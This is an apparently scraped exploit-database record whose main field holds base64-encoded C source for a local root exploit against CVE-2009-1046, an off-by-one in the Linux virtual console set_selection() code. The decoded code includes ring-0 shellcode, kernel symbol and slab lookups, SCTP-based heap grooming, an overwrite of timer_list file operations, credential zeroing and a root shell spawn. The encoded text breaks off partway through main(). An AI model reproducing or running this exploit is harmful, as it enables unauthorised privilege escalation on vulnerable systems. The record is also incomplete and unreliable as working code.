{
    "source": "exploit-database", 
    "exploit": "LyogQ1ZFLTIwMDktMTA0NiBWaXJ0dWFsIENvbnNvbGUgVVRGLTggIHNldF9zZWxlY3Rpb24oKSBvZmYtYnktb25lKHR3bykgTWVtb3J5IENvcnJ1cHRpb24NCiAqIExpbnV4IEtlcm5lbCA8PSAyLjYuMjguMyANCiAqDQogKiBjb2RlZCBieTogc2dyYWtreXUgPGF0PiBhbnRpZm9yay5vcmcNCiAqIGh0dHA6Ly9rZXJuZWxib2YuYmxvZ3Nwb3QuY29tLzIwMDkvMDcvZXZlbi13aGVuLW9uZS1ieXRlLW1hdHRlcnMuaHRtbA0KICoNCiAqIERlZGljYXRlZCB0byBhbGwgcGVvcGxlIHRhbGtpbmcgbm9uc2Vuc2UgYWJvdXQgbm9uIGV4cGxvaXRhYmlsaXR5IG9mIGtlcm5lbCBoZWFwIG9mZi1ieS1vbmUgb3ZlcmZsb3cNCiAqDQogKiBOT1RFLTE6IHlvdSBuZWVkIGEgdmlydHVhbCBjb25zb2xlIGF0dGFjaGVkIHRvIHRoZSBzdGFuZGFyZCBvdXRwdXQgKHN0ZG91dCkgDQogKiAtIHBoeXNpY2FsIGxvZ2luDQogKiAtIHB0cmFjZSgpIGFnYWluc3Qgc29tZSBwcm9jZXNzIHdpdGggdGhlIHNhbWUgdWlkIGFscmVhZHkgYXR0YWNoZWQgdG8gYSBWQw0KICogLSByZW1vdGUgbWFuYWdlbWVudCAuLg0KICoNCiAqIE5PVEUtMjogVVRGLTggY2hhcmFjdGVyIHVzZWQgaXM6IFUrMjUzQyAtIGl0IHNlZW1zIHRvIGJlIHN1cHBvcnRlZCBpbiBtb3N0IHN0YW5kYXJkIGNvbnNvbGUgZm9udHMNCiAqIGJ1dCBpZiBpdCdzIF9ub3RfOiBjaGFuZ2UgaXQgKGFuZCBjaGFuZ2UgcmVzcGVjdGl2ZWx5IFNUUkVBTV9aRVJPIGFuZCBTVFJFQU1fWkVST19BTFQgZGVmaW5lcykNCiAqIElmIHlvdSB1c2UgYW4gdW5zdXBwb3J0ZWQgY2hhcmFjdGVyIGV4cGVjdCBzb21lIHNvcnQgb2YgcmVjdXJzaXZlIGZhdGFsIG9vb3BzOikNCiAqDQogKiBEZXNpZ25lZCB0byBiZSBidWlsdCBhcyB4ODYtNjQgYmluYXJ5IG9ubHkgKFNMVUIgT05MWSkNCiAqIFNDVFAgc3RhY2sgaGFzIHRvIGJlIGF2YWlsYWJsZQ0KICogDQogKiBUZXN0ZWQgb24gdGFyZ2V0Og0KICogVWJ1bnR1IDguMDQgeDg2XzY0ICgyLjYuMjRfMTYtMjMgZ2VuZXJpYy9zZXJ2ZXIpDQogKiBVYnVudHUgOC4xMCB4ODZfNjQgKDIuNi4yN183LTEwIGdlbnJpYy9zZXJ2ZXIpDQogKiBGZWRvcmEgQ29yZSAxMCB4ODZfNjQgKGRlZmF1bHQgaW5zdGFsbGVkIGtlcm5lbCAtIHdpdGhvdXQgc2VsaW51eCkNCiAqDQogKi8NCg0KDQojZGVmaW5lIF9HTlVfU09VUkNFDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzY2hlZC5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQojaW5jbHVkZSA8bmV0aW5ldC9pbi5oPg0KI2luY2x1ZGUgPG5ldGluZXQvc2N0cC5oPg0KI2luY2x1ZGUgPGFycGEvaW5ldC5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4NCiNpbmNsdWRlIDxzeXMvaW9jdGwuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxsaW51eC90aW9jbC5oPg0KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNsdWRlIDxzaWduYWwuaD4NCiNpbmNsdWRlIDxzeXMvbW1hbi5oPg0KI2luY2x1ZGUgPHNjaGVkLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCg0KI2lmbmRlZiBfX3g4Nl82NF9fDQojZXJyb3IgIkFyY2hpdGVjdHVyZSBVbnN1cHBvcnRlZCINCiNlcnJvciAiVGhpcyBjb2RlIHdhcyB3cml0dGVuIGZvciB4ODYtNjQgdGFyZ2V0IGFuZCBoYXMgdG8gYmUgYnVpbHQgYXMgeDg2LTY0IGJpbmFyeSINCiNlbHNlDQoNCiNpZm5kZWYgX191OA0KI2RlZmluZSBfX3U4ICB1aW50OF90DQojZW5kaWYNCiNpZm5kZWYgX191MTYNCiNkZWZpbmUgX191MTYgdWludDE2X3QNCiNlbmRpZg0KI2lmbmRlZiBfX3UzMg0KI2RlZmluZSBfX3UzMiB1aW50MzJfdA0KI2VuZGlmDQojaWZuZGVmIF9fdTY0IA0KI2RlZmluZSBfX3U2NCB1aW50NjRfdA0KI2VuZGlmDQoNCg0KI2RlZmluZSBTVFJFQU1fWkVSTyAxMA0KI2RlZmluZSBTVFJFQU1fWkVST19BTFQgMTINCg0KI2RlZmluZSBTQ1RQX1NUUkVBTSAyMg0KI2RlZmluZSBTVEFDS19TSVpFIDB4MTAwMA0KI2RlZmluZSBQQUdFX1NJWkUgMHgxMDAwDQojZGVmaW5lIFNUUlVDVF9QQUdFICAweDAwMDAwMDAwMDAwMDAwMDANCiNkZWZpbmUgU1RSVUNUX1BBR0VfQUxUIDB4MDAwMDAwMDEwMDAwMDAwMCANCiNkZWZpbmUgQ09ERV9QQUdFICAgICAgMHgwMDAwMDAwMDAwMDEwMDAwDQojZGVmaW5lIExPQ0FMSE9TVCAiMTI3LjAuMC4xIg0KI2RlZmluZSBLTUFMTE9DICJrbWFsbG9jLTEyOCINCiNkZWZpbmUgVElNRVJfTElTVF9GT1BTICJ0aW1lcl9saXN0X2ZvcHMiDQoNCiNkZWZpbmUgX19tc2dfZihmb3JtYXQsIGFyZ3MuLi4pIFwNCiAgZG8geyBmcHJpbnRmKHN0ZG91dCwgZm9ybWF0LCAjIyBhcmdzKTsgfSB3aGlsZSgwKQ0KDQojZGVmaW5lIF9fbXNnKG1zZykgXA0KICBkbyB7IGZwcmludGYoc3Rkb3V0LCAiJXMiLCBtc2cpOyB9IHdoaWxlKDApDQoNCiNkZWZpbmUgX19mYXRhbF9lcnJubyhtc2cpIFwNCmRvIHsgcGVycm9yKG1zZyk7IF9fZnJlZV9zdHVmZigpOyBleGl0KDEpOyB9IHdoaWxlKDApDQoNCiNkZWZpbmUgX19mYXRhbChtc2cpIFwNCmRvIHsgZnByaW50ZihzdGRlcnIsIG1zZyk7IF9fZnJlZV9zdHVmZigpOyBleGl0KDEpOyB9IHdoaWxlKDApDQoNCg0KDQojZGVmaW5lIENKVU1QX09GRiAxMw0KY2hhciByaW5nMFtdPQ0KIlx4NTciICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyAgICBwdXNoICAgJXJkaQ0KIlx4NTAiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyAgICBwdXNoICAgJXJheA0KIlx4NjVceDQ4XHg4Ylx4M2NceDI1XHgwMFx4MDBceDAwXHgwMCIgICAgICAvLyAgICBtb3YgICAgJWdzOjB4MCwlcmRpDQoiXHg0OFx4YjhceDQxXHg0MVx4NDFceDQxXHg0MVx4NDFceDQxXHg0MSIgIC8vICAgIG1vdiAgIHh4eCwgJXJheA0KIlx4ZmZceGQwIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyAgICBjYWxscSAgKiVyYXgNCiJceDU4IiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gICAgcG9wICAgICVyYXgNCiJceDVmIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gICAgcG9wICAgICVyZGkNCiJceGMzIjsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gICAgcmV0cQ0KDQoNCi8qIGNvbm4gc3RydWN0ICovDQpzdGF0aWMgX191MTYgc3J2cG9ydDsNCnN0cnVjdCBzb2NrYWRkcl9pbiBzZXJ2ZXJfczsNCnN0YXRpYyBzdHJ1Y3Qgc29ja2FkZHJfaW4gY2FkZHI7DQoNCi8qIHNvbWUgZmRzLi4gKi8NCnN0YXRpYyBpbnQgZ19hcnJheVsxMF07DQpzdGF0aWMgaW50IGZkX3ptYXBfc3J2PS0xOw0Kc3RhdGljIGludCBrbWFsbG9jX2ZkPS0xOw0Kc3RhdGljIGludCB1bnNhZmVfZmRbNF0gPSB7LTEsLTEsLTEsLTF9OyANCg0KLyogbWlzYyAqLw0Kc3RhdGljIGludCBkb3JlYyA9IDAsIGNhbmtpbGw9MSwgaGlnaHBhZ2U9MDsNCnN0YXRpYyBjaGFyIGNzdGFja1tTVEFDS19TSVpFKjJdOw0Kc3RhdGljIF9fdTE2IHpzdHJlYW09U1RSRUFNX1pFUk87DQpzdGF0aWMgX191MzIgdWlkLGdpZDsNCnN0YXRpYyBfX3U2NCBmb3BzOw0Kc3RhdGljIHBpZF90IGNoaWxkPTA7DQpzdGF0aWMgY2hhciBzeW1idWZbMjAwMDBdOw0KDQpzdGF0aWMgdm9pZCBfX2ZyZWVfc3R1ZmYoKQ0Kew0KICBpbnQgaTsNCiAgZm9yKGk9MzsgaTwyMDQ4OyBpKyspIA0KICB7DQogICAgaWYoKHVuc2FmZV9mZFswXSA9PSBpIHx8IHVuc2FmZV9mZFsxXSA9PSBpIHx8IA0KICAgICAgIHVuc2FmZV9mZFsyXSA9PSBpIHx8IHVuc2FmZV9mZFszXSA9PSBpKSkNCiAgICAgICAgY29udGludWU7IA0KDQogICAgY2xvc2UoaSk7DQogIH0NCn0NCg0Kc3RhdGljIHZvaWQgYmluZGNwdSgpDQp7DQogIGNwdV9zZXRfdCBzZXQ7DQogIENQVV9aRVJPKCZzZXQpOw0KICBDUFVfU0VUKDAsICZzZXQpOw0KICANCiAgaWYoc2NoZWRfc2V0YWZmaW5pdHkoMCwgc2l6ZW9mKGNwdV9zZXRfdCksICZzZXQpIDwgMCkNCiAgICBfX2ZhdGFsX2Vycm5vKCJzZXRhZmZpbml0eSIpOw0KfQ0KDQovKiBwYXJzZSBmdW5jdGlvbnMgYXJlIG5vdCBib2YtZnJlZTopICovDQpzdGF0aWMgX191NjQgZ2V0X2ZvcHNfYWRkcigpDQp7DQogIEZJTEUqIHN0cmVhbTsNCiAgY2hhciBmYnVmWzI1Nl07DQogIGNoYXIgYWRkclszMl07DQogIA0KICBzdHJlYW0gPSBmb3BlbigiL3Byb2Mva2FsbHN5bXMiLCAiciIpOw0KICBpZihzdHJlYW0gPCAwKQ0KICAgIF9fZmF0YWxfZXJybm8oIm9wZW46IGthbGxzeW1zIik7DQoNCiAgbWVtc2V0KGZidWYsIDB4MDAsIHNpemVvZihmYnVmKSk7DQogIHdoaWxlKGZnZXRzKGZidWYsIDI1Niwgc3RyZWFtKSA+IDApDQogIHsNCiAgICBjaGFyICpwID0gZmJ1ZjsNCiAgICBjaGFyICphID0gYWRkcjsNCiAgICBtZW1zZXQoYWRkciwgMHgwMCwgc2l6ZW9mKGFkZHIpKTsNCiAgICBmYnVmW3N0cmxlbihmYnVmKS0xXSA9IDA7DQogICAgd2hpbGUoKnAgIT0gJyAnKQ0KICAgICAgKmErKyA9ICpwKys7ICANCiAgICBwICs9IDM7DQogICAgaWYoIXN0cmNtcChwLCBUSU1FUl9MSVNUX0ZPUFMpKQ0KICAgICAgcmV0dXJuIHN0cnRvdWwoYWRkciwgTlVMTCwgMTYpOyANCiAgfQ0KDQogIHJldHVybiAwOw0KfQ0KDQpzdGF0aWMgaW50IGdldF90b3RhbF9vYmplY3QoaW50IGZkKQ0Kew0KICBjaGFyIG5hbWVbMzJdOw0KICBjaGFyIHVzZWRbMzJdOw0KICBjaGFyIHRvdGFsWzMyXTsNCiAgY2hhciAqcHRyW10gPSB7bmFtZSwgdXNlZCwgdG90YWx9Ow0KICBpbnQgcmV0LGksdG9yZWFkPXNpemVvZihzeW1idWYpLTE7DQogIGNoYXIgKnAgPSBzeW1idWY7DQoNCiAgbHNlZWsoZmQsIDAsIFNFRUtfU0VUKTsNCiAgbWVtc2V0KHN5bWJ1ZiwgMHgwMCwgc2l6ZW9mKHN5bWJ1ZikpOw0KICB3aGlsZSggKHJldCA9IHJlYWQoZmQsIHAsIHRvcmVhZCkpID4gMCkNCiAgew0KICAgIHAgKz0gcmV0OyANCiAgICB0b3JlYWQgLT0gcmV0Ow0KICB9DQoNCiAgcCA9IHN5bWJ1ZjsNCiAgZG8NCiAgew0KICAgIGZvcihpPTA7IGk8c2l6ZW9mKHB0cikvc2l6ZW9mKHZvaWQqKTsgaSsrKQ0KICAgIHsNCiAgICAgIGNoYXIgKmQgPSBwdHJbaV07DQogICAgICB3aGlsZSgqcCAhPSAnICcpDQogICAgICAgICpkKysgPSAqcCsrOyAgIA0KICAgICAgKmQgPSAwOw0KICAgICAgd2hpbGUoKnAgPT0gJyAnKQ0KICAgICAgICBwKys7DQogICAgfQ0KICAgIA0KICAgIHdoaWxlKCpwKysgIT0gJ1xuJyk7DQogIA0KICAgIGlmKCFzdHJjbXAoS01BTExPQywgbmFtZSkpDQogICAgICByZXR1cm4gYXRvaSh0b3RhbCk7ICANCg0KICB9IHdoaWxlKCpwICE9IDApOw0KICByZXR1cm4gMDsNCn0NCg0KDQpzdGF0aWMgdm9pZCByaW5nMGModm9pZCogdCkNCnsNCiAgaW50IGk7DQogIF9fdTMyICpwID0gdDsNCiAgZm9yKGk9MDsgaTwxMTAwOyBpKysscCsrKQ0KICB7DQogICAgICBpZihwWzBdID09IHVpZCAmJiBwWzFdID09IHVpZCAmJiBwWzJdID09IHVpZCAmJiBwWzNdID09IHVpZCAmJg0KICAgICAgICAgcFs0XSA9PSBnaWQgJiYgcFs1XSA9PSBnaWQgJiYgcFs2XSA9PSBnaWQgJiYgcFs3XSA9PSBnaWQpDQogICAgICAgICB7DQogICAgICAgICAgIHBbMF0gPSBwWzFdID0gcFsyXSA9IHBbM10gPSAwOw0KICAgICAgICAgICBwWzRdID0gcFs1XSA9IHBbNl0gPSBwWzddID0gMDsNCiAgICAgICAgICAgLyogZG9udCBjYXJlIGFib3V0IGNhcHMgKi8NCiAgICAgICAgICAgYnJlYWs7DQogICAgICAgICB9DQogIH0NCn0NCg0KDQpzdGF0aWMgaW50IGdldF9rbWFsbG9jX2ZkKCkNCnsNCiAgaW50IGZkOw0KICBmZCA9IG9wZW4oIi9wcm9jL3NsYWJpbmZvIiwgT19SRE9OTFkpOw0KICBpZihmZCA8IDApDQogICAgX19mYXRhbF9lcnJubygib3Blbjogc2xhYmluZm8iKTsNCiAgcmV0dXJuIGZkOw0KfQ0KDQoNCnN0YXRpYyBpbnQgd3JpdGVfc2N0cChpbnQgZmQsIHN0cnVjdCBzb2NrYWRkcl9pbiAqcywgaW50IGNoYW5uZWwpDQp7DQogIGludCByZXQ7DQogIHJldCA9IHNjdHBfc2VuZG1zZyhmZCwgImEiLCAxLA0KICAgICAgICAgICAgICAgKHN0cnVjdCBzb2NrYWRkciAqKXMsIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHJfaW4pLA0KICAgICAgICAgICAgICAgMCwgMCwgY2hhbm5lbCwgMCAsMCk7DQogIHJldHVybiByZXQ7DQp9DQoNCg0Kc3RhdGljIHZvaWQgc2V0X3NjdHBfc29ja19vcHQoaW50IGZkLCBfX3UxNiBpbiwgX191MTYgb3V0KQ0Kew0KICBzdHJ1Y3Qgc2N0cF9pbml0bXNnIG1zZzsNCiAgaW50IHZhbD0xOw0KICBzb2NrbGVuX3QgbGVuX3NjdHAgPSBzaXplb2Yoc3RydWN0IHNjdHBfaW5pdG1zZyk7DQogIGdldHNvY2tvcHQoZmQsIFNPTF9TQ1RQLCBTQ1RQX0lOSVRNU0csICZtc2csICZsZW5fc2N0cCk7DQogIG1zZy5zaW5pdF9udW1fb3N0cmVhbXM9b3V0OyANCiAgbXNnLnNpbml0X21heF9pbnN0cmVhbXM9aW47DQogIHNldHNvY2tvcHQoZmQsIFNPTF9TQ1RQLCBTQ1RQX0lOSVRNU0csICZtc2csIGxlbl9zY3RwKTsNCiAgc2V0c29ja29wdChmZCwgU09MX1NDVFAsIFNDVFBfTk9ERUxBWSwgKGNoYXIqKSZ2YWwsIHNpemVvZih2YWwpKTsNCn0NCg0KDQpzdGF0aWMgaW50IGNyZWF0ZV9hbmRfaW5pdCh2b2lkKQ0Kew0KICBpbnQgZmQgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fU0NUUCk7DQogIGlmKGZkIDwgMCkNCiAgICBfX2ZhdGFsX2Vycm5vKCJzb2NrZXQ6IHNjdHAiKTsNCiAgc2V0X3NjdHBfc29ja19vcHQoZmQsIFNDVFBfU1RSRUFNLCBTQ1RQX1NUUkVBTSk7DQogIHJldHVybiBmZDsNCn0NCg0KDQpzdGF0aWMgdm9pZCBjb25uZWN0X3BlZXIoaW50IGZkLCBzdHJ1Y3Qgc29ja2FkZHJfaW4gKnMpDQp7IA0KICBpbnQgcmV0Ow0KICByZXQgPSBjb25uZWN0KGZkLCAoc3RydWN0IHNvY2thZGRyICopcywgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbikpOw0KICBpZihyZXQgPCAwKQ0KICAgIF9fZmF0YWxfZXJybm8oImNvbm5lY3Q6IG9uZSBwZWVyIik7DQp9DQoNCg0Kc3RhdGljIHZvaWQgY29ubl9hbmRfd3JpdGUoaW50IGZkLCBzdHJ1Y3Qgc29ja2FkZHJfaW4gKnMsIF9fdTE2IHN0cmVhbSkNCnsNCiAgY29ubmVjdF9wZWVyKGZkLHMpOw0KICB3cml0ZV9zY3RwKGZkLCBzLCBzdHJlYW0pOw0KfQ0KDQoNCnN0YXRpYyBpbnQgY2xvbmVfdGhyZWFkKHZvaWQqdXNlbGVzcykNCnsNCiAgaW50IG8gPSAxOw0KICBpbnQgYz0wLGlkeD0wOw0KICBpbnQgZmQsIHJldDsNCiAgc3RydWN0IHNvY2thZGRyX2luIHRtcDsNCiAgc29ja2xlbl90IGxlbjsNCg0KICBiaW5kY3B1KCk7DQogIHNlcnZlcl9zLnNpbl9mYW1pbHkgPSBQRl9JTkVUOw0KICBzZXJ2ZXJfcy5zaW5fcG9ydCA9IGh0b25zKHNydnBvcnQpOyANCiAgc2VydmVyX3Muc2luX2FkZHIuc19hZGRyID0gaW5ldF9hZGRyKExPQ0FMSE9TVCk7DQoNCiAgZmQgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fU0NUUCk7DQogIGlmKGZkIDwgMCkNCiAgICByZXR1cm4gLTE7DQoNCiAgc2V0X3NjdHBfc29ja19vcHQoZmQsIFNDVFBfU1RSRUFNLCBTQ1RQX1NUUkVBTSk7ICAgDQogIHNldHNvY2tvcHQoZmQsIFNPTF9TT0NLRVQsIFNPX1JFVVNFQUREUiwgKGNoYXIgKikmbywgc2l6ZW9mKG8pKTsNCg0KICByZXQgPSBiaW5kKGZkLCAoc3RydWN0IHNvY2thZGRyICopJnNlcnZlcl9zLCBzaXplb2Yoc3RydWN0IHNvY2thZGRyX2luKSk7DQogIGlmKHJldCA8IDApDQogICAgcmV0dXJuIC0xOw0KDQogIHJldCA9IGxpc3RlbihmZCwgMTAwKTsNCiAgaWYocmV0IDwgMCkNCiAgICByZXR1cm4gLTE7DQoNCiAgbGVuID0gc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbik7DQogIHdoaWxlKChyZXQgPSBhY2NlcHQoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikmdG1wLCAmbGVuKSkgPj0gMCkNCiAgew0KICAgIGlmKGRvcmVjICE9IDAgJiYgYyA+PSBkb3JlYyAmJiBpZHggPCAxMCkNCiAgICB7DQogICAgICBnX2FycmF5W2lkeF0gPSByZXQ7DQogICAgICBpZihpZHg9PTkpDQogICAgICB7DQogICAgICAgIGZkX3ptYXBfc3J2ID0gcmV0Ow0KICAgICAgICBjYWRkciA9IHRtcDsNCiAgICAgICAgYnJlYWs7DQogICAgICB9DQogICAgICBpZHgrKzsNCiAgICB9DQogICAgYysrOyAgIA0KICAgIHdyaXRlX3NjdHAocmV0LCAmdG1wLCB6c3RyZWFtKTsNCiAgfQ0KICANCiAgc2xlZXAoMSk7DQogIHJldHVybiAwOyANCn0NCg0KDQpzdGF0aWMgaW50IGRvX21tYXAodW5zaWduZWQgbG9uZyBiYXNlLCBpbnQgbnBhZ2VzKQ0Kew0KICB2b2lkKmFkZHIgPSBtbWFwKCh2b2lkKiliYXNlLCBQQUdFX1NJWkUqbnBhZ2VzLA0KICAgICAgICAgICAgICAgICAgIFBST1RfUkVBRHxQUk9UX1dSSVRFfFBST1RfRVhFQywgIA0KICAgICAgICAgICAgICAgICAgIE1BUF9QUklWQVRFIHwgTUFQX0FOT05ZTU9VUyB8IE1BUF9GSVhFRCwgLTEsIDApOw0KDQogIGlmKE1BUF9GQUlMRUQgPT0gYWRkcikNCiAgICByZXR1cm4gLTE7DQoNCiAgbWVtc2V0KGFkZHIsIDB4MDAsIFBBR0VfU0laRSpucGFnZXMpOw0KICANCiAgcmV0dXJuIDA7DQp9DQoNCnBpZF90IHN0YXJ0X2xpc3RlbmVyKCkNCnsNCiAgcGlkX3QgcGlkOw0KICBwaWQgPSBjbG9uZShjbG9uZV90aHJlYWQsIGNzdGFjaytTVEFDS19TSVpFLTgsIA0KICAgICAgICAgICAgICBDTE9ORV9WTXxDTE9ORV9GSUxFU3xTSUdDSExELCBOVUxMKTsNCiAgDQogIHJldHVybiBwaWQ7DQp9IA0KDQpzdGF0aWMgdm9pZCBkb19zb2NrcyhzdHJ1Y3Qgc29ja2FkZHJfaW4gKnMsIF9fdTE2IHN0cmVhbSkNCnsNCiAgaW50IGksZmQ7DQogIGludCBuX29ianMgPSBnZXRfdG90YWxfb2JqZWN0KGttYWxsb2NfZmQpLCB0bXBfbl9vYmpzOw0KICBpbnQgbmV4dD04Ow0KDQogIGZvcihpPTA7IG5leHQgIT0gMDsgaSsrKQ0KICB7DQogICAgZmQgPSBjcmVhdGVfYW5kX2luaXQoKTsNCg0KICAgIHRtcF9uX29ianMgPSBnZXRfdG90YWxfb2JqZWN0KGttYWxsb2NfZmQpOyANCiAgICBpZighZG9yZWMgJiYgdG1wX25fb2JqcyAhPSBuX29ianMpDQogICAgICBkb3JlYz1pOyANCg0KICAgIGNvbm5fYW5kX3dyaXRlKGZkLCBzLCBzdHJlYW0pOw0KICAgIGlmKGRvcmVjKQ0KICAgICAgbmV4dC0tOw0KICB9DQp9DQoNCg0Kc3RhdGljIHZvaWQgY2xyKGludCBmZCkNCnsNCiAgLyogdXNlIHRlcm1jYXAgaW5zdGVhZC4uKi8NCiAgd3JpdGUoZmQsICJcMzNbSFwzM1tKIiwgNik7ICANCn0NCg0Kc3RhdGljIGNoYXIgdGlvYnVmZmVyWzIwNDhdOw0Kdm9pZCBhbGxvY190aW9jbGludXgoKQ0Kew0KICBpbnQgaTsNCiAgY2hhciBvdXRbMTI4KjNdOw0KICAvKiBVbmljb2RlIENoYXJhY3RlciAnQk9YIERSQVdJTkdTIExJR0hUIFZFUlRJQ0FMIEFORCBIT1JJWk9OVEFMJyAoVSsyNTNDKSAqLw0KICBjaGFyIHV0ZjhbM10gPSB7IDB4RTIsIDB4OTQsIDB4QkMgfTsgIA0KICAvL2NoYXIgdXRmOFszXSA9IHsgMHhFMiwgMHg4MCwgMHhCQyB9OyAgDQogIHN0cnVjdCB0aW9jbF9zZWxlY3Rpb24gKnNlbDsNCiAgY2hhciAqdDsNCiAgdm9pZCAqdiA9IG1hbGxvYyhzaXplb2Yoc3RydWN0IHRpb2NsX3NlbGVjdGlvbikgKyAxKTsNCiAgdCA9IChjaGFyKil2OyANCiAgc2VsID0gKHN0cnVjdCB0aW9jbF9zZWxlY3Rpb24gKikodCsxKTsNCiAgbWVtc2V0KG91dCwgMHg0MSwgc2l6ZW9mKG91dCkpOyANCiAgZm9yKGk9MDsgaTwxMjg7IGkrKykgDQogIHsNCiAgICB0aW9idWZmZXJbKGkqMyldPXV0ZjhbMF07DQogICAgdGlvYnVmZmVyWyhpKjMpKzFdPXV0ZjhbMV07DQogICAgdGlvYnVmZmVyWyhpKjMpKzJdPXV0ZjhbMl07DQogIH0NCg0KICAqdCA9IFRJT0NMX1NFVFNFTDsNCiAgc2VsLT54cyA9IDE7DQogIHNlbC0+eXMgPSAxOw0KICBzZWwtPnhlID0gNDM7DQogIC8vc2VsLT54ZSA9IDQyOyAvKiBubyBvdmVyZmxvdyAqLw0KICBzZWwtPnllID0gMTsNCiAgDQogIHdyaXRlKDEsIHRpb2J1ZmZlciwgc2l6ZW9mKHRpb2J1ZmZlcikpOw0KICBpZihpb2N0bCgxLCBUSU9DTElOVVgsIHYpIDwgMCkNCiAgICBfX2ZhdGFsKCJbISFdIFVuYWJsZSB0byBjYWxsIFRJT0NMSU5VWCBpb2N0bCgpLCBuZWVkIHN0ZG91dCB0byBiZSBvbiBhIHZpcnR1YWwgY29uc29sZVxuIik7DQp9DQoNCg0KDQpzdGF0aWMgdm9pZCBtaWdyYXRlX2V2aWxfZmQoKQ0Kew0KICBpbnQgaTsNCiAgcGlkX3QgY2hpbGQ7DQoNCiAgX19tc2coIlsqKl0gTWlncmF0ZSBldmlsIHVuc2FmZSBmZHMgdG8gY2hpbGQgcHJvY2Vzcy4uXG4iKTsNCiAgY2hpbGQgPSBmb3JrKCk7DQogIGlmKCFjaGlsZCkNCiAgew0KDQogICAgLyogcHJlc2VydmUgZXZpbCBmZHMgKi8NCiAgICBzZXRzaWQoKTsgDQogICAgaWYoIWNhbmtpbGwpIC8qIGNhbnQgZGllIC4uICovDQogICAgICB3aGlsZSgxKQ0KICAgICAgICBzbGVlcCgxKTsNCiAgICBlbHNlDQogICAgew0KICAgICAgc2xlZXAoMTApOyAvKiB3YWl0IGV4ZWN2ZSgpIGJlZm9yZSAqLyANCiAgICAgIGZvcihpPTA7IGk8NDsgaSsrKQ0KICAgICAgICBjbG9zZSh1bnNhZmVfZmRbaV0pOyANCg0KICAgICAgZXhpdCgxKTsNCiAgICB9DQogIH0NCiAgZWxzZQ0KICB7DQogICAgaWYoIWNhbmtpbGwpDQogICAgICBfX21zZ19mKCJbKipdIENoaWxkIHByb2Nlc3MgJWQgX01VU1RfIE5PVCBkaWUgLi4uIGtlZXAgaXQgYWxpdmU6KVxuIiwgY2hpbGQpOw0KICB9DQp9DQoNCg0Kc3RhdGljIHZvaWQgdHJpZ2dlcl9mYXVsdCgpDQp7DQogIGNoYXIgKmFyZ3ZbXT17Ii9iaW4vc2giLCBOVUxMfTsNCiAgaW50IGZkLGk7DQoNCiAgZmQgPSBvcGVuKCIvcHJvYy90aW1lcl9saXN0IiwgT19SRE9OTFkpOw0KICBpZihmZCA+PSAwKQ0KICB7DQogICAgaW9jdGwoZmQsIDAsIDApOw0KICAgIF9fZnJlZV9zdHVmZigpOw0KICAgIG1pZ3JhdGVfZXZpbF9mZCgpOw0KICAgIA0KICAgIGZvcihpPTA7IGk8NDsgaSsrKQ0KICAgICAgY2xvc2UodW5zYWZlX2ZkW2ldKTsNCg0KICAgIGlmKCFnZXR1aWQoKSkNCiAgICB7DQogICAgICBfX21zZygiWyoqXSBHb3Qgcm9vdCFcbiIpOw0KICAgICAgZXhlY3ZlKCIvYmluL3NoIiwgYXJndiwgTlVMTCk7IA0KICAgIH0NCiAgfQ0KICBlbHNlDQogIHsNCiAgICBfX21zZygiWyoqXSBDYW5ub3Qgb3BlbiAvcHJvYy90aW1lcl9saXN0Iik7DQogICAgX19mcmVlX3N0dWZmKCk7DQogIH0NCn0NCg0KDQoNCnN0YXRpYyB2b2lkIG92ZXJ3cml0ZV9mb3BzKCBpbnQgc2VuZGVyLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJ1Y3Qgc29ja2FkZHJfaW4gKnRvX3JlY2VpdmVyLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludCByZWNlaXZlcikNCnsNCiAgY2hhciAqcCA9IE5VTEw7DQogIGlmKCFoaWdocGFnZSkNCiAgICBwKys7DQogIGVsc2UNCiAgICBwID0gKHZvaWQqKVNUUlVDVF9QQUdFX0FMVDsNCg0KICBfX3U2NCAqdWlwID0gKF9fdTY0KilwOyAgDQogICp1aXAgPSBmb3BzOw0KICB3cml0ZV9zY3RwKHNlbmRlciwgdG9fcmVjZWl2ZXIsIDEpOyAgDQogIHNsZWVwKDEpOw0KICB0cmlnZ2VyX2ZhdWx0KCk7DQp9DQoNCnN0YXRpYyBfX3UxNiBnZXRfcG9ydCgpDQp7DQogIF9fdTE2IHIgPSAoX191MTYpZ2V0cGlkKCk7DQogIGlmKHIgPD0gMHg0MDApDQogICAgcis9MHg0MDA7DQogIHJldHVybiByOw0KfQ0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKQ0Kew0KICBpbnQgcGVlcngsIHBlZXJ5LGk7DQogIF9fdTY0ICpwYXRjaDsNCg0KICBzcnZwb3J0ID0gZ2V0X3BvcnQoKTsNCg0KICB1aWQ9Z2V0dWlkKCk7DQogIGdpZD1nZXRnaWQoKTsNCiAgZm9wcz1nZXRfZm9wc19hZGRyKCkgKyA2NDsgDQogIGlmKCFmb3BzKQ0KICB7DQogICAgX19tc2coIlshIV0gVW5hYmxlIHRvIGxvY2F0ZSBzeW1ib2xzLi4uXG4iKTsNC